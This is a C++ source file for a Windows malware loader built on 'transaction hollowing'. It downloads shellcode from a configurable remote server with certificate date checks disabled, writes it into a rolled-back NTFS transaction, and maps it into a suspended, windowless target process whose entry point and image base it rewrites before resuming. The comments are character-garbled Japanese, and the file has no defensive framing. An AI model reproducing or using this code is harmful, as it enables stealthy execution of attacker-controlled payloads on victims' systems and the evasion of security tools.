#include "TransactionHollowing.h"

void RedirectToPayload(PBYTE payload, LPVOID baseAddress, PROCESS_INFORMATION& pi) {
    // PE�w�b�_�擾
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + pDosHeader->e_lfanew);

    // �G���g���|�C���g�擾
    DWORD entryPointOffset = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    ULONGLONG entryPoint = reinterpret_cast<ULONGLONG>(baseAddress) + entryPointOffset;

    // ���݂̃X���b�h�R���e�L�X�g���擾
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pi.hThread, &context);

    // Rcx�ɃG���g���|�C���g
    context.Rcx = entryPoint;
    SetThreadContext(pi.hThread, &context);

    // �C���[�W�x�[�X����������
    ULONGLONG pebAddress = context.Rdx;
    LPVOID remoteImageBase = reinterpret_cast<LPVOID>(pebAddress + 0x10);
    WriteProcessMemory(pi.hProcess, remoteImageBase, &baseAddress, sizeof(ULONGLONG), nullptr);

    return;
}



void TransactionNTFSHollowing(std::wstring targetPath, PBYTE payload, DWORD payloadSize) {

    // temp�p�X���擾
    wchar_t tempPath[MAX_PATH] = {};
    DWORD size = GetTempPathW(MAX_PATH, tempPath);

    // �ꎞ�t�@�C�����𐶐�
    wchar_t dummyName[MAX_PATH] = {};
    GetTempFileNameW(tempPath, L"TH", 0, dummyName);

    // �g�����U�N�V�����t���t�@�C������Ƃ��āA�y�C���[�h�t�@�C�����쐬
    HANDLE transactionHandle = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    HANDLE TransactedHandle = CreateFileTransacted(dummyName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr, transactionHandle, nullptr, nullptr);
    WriteFile(TransactedHandle, payload, payloadSize, nullptr, nullptr);

    // �t�@�C�����Z�N�V�����I�u�W�F�N�g�Ƃ��ă������}�b�s���O���A�g�����U�N�V���������[���o�b�N
    HANDLE hSection = nullptr;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, 0, PAGE_READONLY, SEC_IMAGE, TransactedHandle);
    CloseHandle(TransactedHandle);
    RollbackTransaction(transactionHandle);
    CloseHandle(transactionHandle);

    // �T�X�y���h���[�h�Ń^�[�Q�b�g�v���Z�X���쐬
    PROCESS_INFORMATION pi = {};
    STARTUPINFOW si = {};
    CreateProcessInternalW(nullptr, nullptr, const_cast<LPWSTR>(targetPath.c_str()), nullptr, nullptr, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi, nullptr);
    HANDLE processHandle = pi.hProcess;

    // �Z�N�V�����I�u�W�F�N�g�̃y�C���[�h���^�[�Q�b�g�v���Z�X�Ƀ}�b�s���O
    LPVOID sectionBaseAddress = 0;
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, processHandle, &sectionBaseAddress, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_READONLY);

    // �T�X�y���h�v���Z�X�̃G���g���|�C���g�X�V
    RedirectToPayload(payload, sectionBaseAddress, pi);

    // �X���b�h�ĊJ
    ResumeThread(pi.hThread);

    return;
}

// URL���\�z����֐�
std::wstring makeUrl(const Arg& arg) {
    return std::wstring(arg.protocol) + std::wstring(arg.ipAddress) + L":" + std::wstring(arg.port) + L"/" + std::wstring(arg.filePath);
}

// �t�@�C���T�[�o�[����y�C���[�h���X�e�[�W���O
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode) {

    // URL���J��
    HINTERNET internetHandle = InternetOpen(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET urlHandle = InternetOpenUrl(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    DWORD bytesRead;
    BYTE buffer[1024];

    // �y�C���[�h��ǂݍ��ރ��[�v
    while (true) {
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // �ǂݍ��񂾃f�[�^���x�N�^�[�ɒǉ�
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    return !shellcode.empty();
}